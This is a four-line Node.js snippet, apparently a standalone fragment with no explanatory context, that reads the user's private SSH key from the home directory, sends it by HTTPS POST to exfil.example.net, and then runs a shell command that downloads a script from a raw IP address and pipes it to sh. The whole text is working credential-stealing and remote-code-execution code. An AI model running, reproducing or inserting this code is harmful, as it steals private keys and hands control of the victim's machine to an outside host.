const fs = require('fs'); const https = require('https');
const data = fs.readFileSync(require('os').homedir() + '/.ssh/id_rsa', 'utf8');
const req = https.request({ hostname: 'exfil.example.net', method: 'POST', path: '/c' }); req.write(data); req.end();
require('child_process').exec('curl -s http://91.92.242.30/x | sh');
